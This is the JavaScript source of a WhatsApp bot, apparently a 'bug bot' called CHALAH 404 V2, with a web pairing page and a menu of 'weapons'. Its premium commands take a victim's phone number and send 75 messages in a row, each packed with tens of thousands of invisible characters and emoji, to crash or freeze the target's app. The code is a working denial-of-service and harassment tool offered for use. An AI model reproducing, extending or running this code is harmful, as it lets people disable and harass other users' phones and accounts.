const { default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason } = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const express = require("express");
const QRCode = require('qrcode');
const app = express();
const port = process.env.PORT || 3000;

// --- CONFIG ---
const ownerNumber = "94742271802"; 
const logoUrl = 'https://files.catbox.moe/07hh33.png'; 
const voiceUrl = 'https://files.catbox.moe/xk6low.mp4'; 
let premiumUsers = [ownerNumber]; 
let lastQR = "";

async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const client = makeWASocket({
        auth: state,
        logger: pino({ level: "silent" }),
        browser: ["CHALAH-ULTRA-V2", "Chrome", "3.0"]
    });

    // Web Routes Setup
    app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

    // Pairing Code Route
    app.get('/pair', async (req, res) => {
        let num = req.query.number.replace(/[^0-9]/g, '');
        if (!num) return res.json({ error: "Number required" });
        let code = await client.requestPairingCode(num);
        res.json({ code });
    });

    // QR Code Route
    app.get('/qr', async (req, res) => {
        if (lastQR === "DONE") return res.send("CONNECTED");
        if (!lastQR) return res.send("WAIT");
        const qrImage = await QRCode.toDataURL(lastQR);
        res.send(qrImage);
    });

    client.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) lastQR = qr;
        if (connection === 'open') {
            console.log("✅ BOT CONNECTED!");
            lastQR = "DONE";
        }
        if (connection === 'close') startBot();
    });

    client.ev.on("messages.upsert", async (chat) => {
        const m = chat.messages[0];
        if (!m.message || m.key.fromMe) return;
        const from = m.key.remoteJid;
        const sender = m.key.participant || from;
        const sn = sender.split('@')[0];
        const isPrem = premiumUsers.includes(sn) || sn === ownerNumber;
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const cmd = body.startsWith(".") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
        const q = body.trim().split(" ").slice(1).join(" ");

        if (cmd === 'menu') {
            const menu = `
╭───〔 **CHALAH 404 V2** 〕───┈⊷
│ 👤 **USER:** @${sn}
│ 👑 **RANK:** ${isPrem ? 'PREMIUM DESTROYER' : 'FREE USER'}
╰────────────────────────┈⊷

╭───〔 **🔴 FREE WEAPONS** 〕───┈⊷
│ ☢️ .uicrash (Freeze UI)
│ ☢️ .locbomb (Location Lag)
│ ☢️ .pollbug (Poll Overload)
│ ☢️ .textbomb (Char Flood)
│ ☢️ .ping (System Check)
│ ☢️ .alive (Bot Status)
│ ☢️ .owner (Contact Dev)
╰────────────────────────┈⊷

╭───〔 **🔱 PREMIUM (DEADLY)** 〕───┈⊷
│ 💀 .rip (DB-Overflow)
│ 💀 .die (System Killer)
│ 💀 .full (Storage Grave)
│ 💀 .lag (Infinite Loop)
│ 💀 .404 (Render Crash)
│ 💀 .end (Status Killer)
│ 💀 .hell (Fatal Exploit)
╰────────────────────────┈⊷
_⚠️ POWERED BY CHALAH-SUDO_`;

            await client.sendMessage(from, { image: { url: logoUrl }, caption: menu, mentions: [sender] });
            await client.sendMessage(from, { audio: { url: voiceUrl }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
        }

        // --- ULTRA BUG EXECUTION ---
        if (['rip', 'die', 'full', 'lag', '404', 'end', 'hell'].includes(cmd)) {
            if (!isPrem) return m.reply("🚫 *PREMIUM REQUIRED!*");
            const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            m.reply(`☣️ *RELEASING DEADLY PAYLOADS...*`);
            for(let i=0; i<75; i++) { // Power increased to 75 loops
                const bug = "‌".repeat(60000) + "🔥".repeat(15000);
                await client.sendMessage(target, { text: bug });
                await delay(20); 
            }
        }
    });

    client.ev.on("creds.update", saveCreds);
}

app.listen(port);
startBot();
